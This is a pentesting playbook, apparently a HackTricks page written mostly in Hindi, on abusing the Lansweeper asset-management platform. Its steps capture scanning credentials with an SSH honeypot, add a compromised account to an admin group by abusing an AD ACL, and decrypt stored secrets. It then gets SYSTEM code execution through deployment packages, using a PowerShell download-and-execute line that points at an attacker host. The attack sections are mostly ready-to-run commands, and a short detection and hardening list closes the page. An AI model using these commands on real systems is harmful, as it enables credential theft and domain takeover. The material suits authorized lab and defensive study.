# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, और Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper एक IT asset discovery और inventory platform है, जिसे आमतौर पर Windows पर deploy किया जाता है और Active Directory के साथ integrate किया जाता है। Lansweeper में configured credentials का उपयोग इसके scanning engines द्वारा SSH, SMB/WMI और WinRM जैसे protocols के माध्यम से assets पर authenticate करने के लिए किया जाता है। Misconfigurations अक्सर निम्नलिखित की अनुमति देती हैं:

- किसी scanning target को attacker-controlled host (honeypot) पर redirect करके Credential interception
- Lansweeper-related groups द्वारा exposed AD ACLs का Abuse करके remote access प्राप्त करना
- On-host Lansweeper-configured secrets (connection strings और stored scanning credentials) का decryption
- Deployment feature के माध्यम से managed endpoints पर code execution (अक्सर SYSTEM के रूप में चलने वाला)

यह page engagements के दौरान इन behaviors का Abuse करने के लिए practical attacker workflows और commands का सारांश देती है।

## 1) Honeypot के माध्यम से scanning credentials harvest करना (SSH example)

Idea: ऐसा Scanning Target बनाएं जो आपके host की ओर point करे और मौजूदा Scanning Credentials को उससे map करें। जब scan चलेगा, Lansweeper उन credentials से authenticate करने का प्रयास करेगा और आपका honeypot उन्हें capture कर लेगा।<sup>[[1]](#references)</sup>

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (या Single IP) = आपका VPN IP
- SSH port को किसी reachable port पर configure करें (उदाहरण के लिए, यदि 22 blocked है तो 2022)
- Schedule disable करें और manually trigger करने की योजना बनाएं
- Scanning → Scanning Credentials → सुनिश्चित करें कि Linux/SSH creds मौजूद हैं; उन्हें नए target से map करें (आवश्यकतानुसार सभी enable करें)
- Target पर “Scan now” click करें
- SSH honeypot चलाएं और attempted username/password प्राप्त करें

sshesame के साथ example:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Captured creds को DC services के विरुद्ध validate करें:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
नोट्स
- यह अन्य protocols के लिए भी इसी तरह काम करता है, जब आप scanner को अपने listener (SMB/WinRM honeypots आदि) की ओर coerce कर सकते हैं। SSH अक्सर सबसे सरल होता है।
- कई scanners अलग-अलग client banners (जैसे RebexSSH) से अपनी पहचान बताते हैं और benign commands (uname, whoami आदि) चलाने का प्रयास करेंगे।

## 2) AD ACL abuse: स्वयं को app-admin group में जोड़कर remote access प्राप्त करें

compromised account से effective rights enumerate करने के लिए BloodHound का उपयोग करें। एक सामान्य finding scanner- या app-specific group (जैसे “Lansweeper Discovery”) का किसी privileged group (जैसे “Lansweeper Admins”) पर GenericAll रखना है। यदि privileged group “Remote Management Users” का भी member है, तो स्वयं को जोड़ने के बाद WinRM उपलब्ध हो जाता है।<sup>[[1]](#references)[[5]](#references)</sup>

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
BloodyAD के साथ group पर GenericAll का exploit (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
फिर एक interactive shell प्राप्त करें:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
टिप: Kerberos operations समय-संवेदी होते हैं। यदि आपको KRB_AP_ERR_SKEW मिले, तो पहले DC के साथ sync करें:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Host पर Lansweeper-configured secrets को decrypt करें

Lansweeper server पर, ASP.NET site आमतौर पर application द्वारा उपयोग की जाने वाली एक encrypted connection string और symmetric key store करती है। उपयुक्त local access के साथ, आप DB connection string को decrypt कर सकते हैं और फिर stored scanning credentials extract कर सकते हैं।<sup>[[1]](#references)</sup>

Typical locations:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Stored creds की decryption और dumping को automate करने के लिए SharpLansweeperDecrypt का उपयोग करें:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
अपेक्षित आउटपुट में DB connection details और plaintext में scanning credentials शामिल होते हैं, जैसे पूरे estate में उपयोग किए जाने वाले Windows और Linux accounts। इन accounts के पास अक्सर domain hosts पर elevated local rights होते हैं:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
privileged access के लिए recovered Windows scanning creds का उपयोग करें:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“Lansweeper Admins” के सदस्य के रूप में, web UI में Deployment और Configuration दिखाई देते हैं। Deployment → Deployment packages के अंतर्गत, आप ऐसे packages बना सकते हैं जो लक्षित assets पर arbitrary commands चलाते हैं। Execution उच्च privilege के साथ Lansweeper service द्वारा किया जाता है, जिससे चयनित host पर NT AUTHORITY\SYSTEM के रूप में code execution प्राप्त होता है।<sup>[[1]](#references)</sup>

High-level steps:
- ऐसा नया Deployment package बनाएं जो PowerShell या cmd one-liner (reverse shell, add-user, आदि) चलाए।
- इच्छित asset (जैसे वह DC/host जहां Lansweeper चलता है) को target करें और Deploy/Run now पर click करें।
- अपना shell SYSTEM के रूप में प्राप्त करें।

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions noisy होती हैं और Lansweeper तथा Windows event logs में लॉग छोड़ती हैं। इनका विवेकपूर्ण उपयोग करें।

## Detection और hardening

- Anonymous SMB enumerations को restrict या remove करें। RID cycling और Lansweeper shares तक असामान्य access की निगरानी करें।
- Egress controls: scanner hosts से outbound SSH/SMB/WinRM को block या कड़ाई से restrict करें। non-standard ports (जैसे, 2022) और Rebex जैसे असामान्य client banners पर alert करें।
- `Website\\web.config` और `Key\\Encryption.txt` को सुरक्षित रखें। Secrets को vault में externalize करें और exposure होने पर rotate करें। न्यूनतम privileges वाले service accounts और जहां संभव हो, gMSA का उपयोग करने पर विचार करें।
- AD monitoring: Lansweeper-संबंधित groups (जैसे, “Lansweeper Admins”, “Remote Management Users”) में होने वाले changes और privileged groups की membership पर GenericAll/Write देने वाले ACL changes पर alert करें।
- Deployment package creations/changes/executions का audit करें; cmd.exe/powershell.exe चलाने वाले या unexpected outbound connections बनाने वाले packages पर alert करें।

## Related topics
- SMB/LSA/SAMR enumeration और RID cycling
- Kerberos password spraying और clock skew considerations
- application-admin groups का BloodHound path analysis
- WinRM usage और lateral movement

## References
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
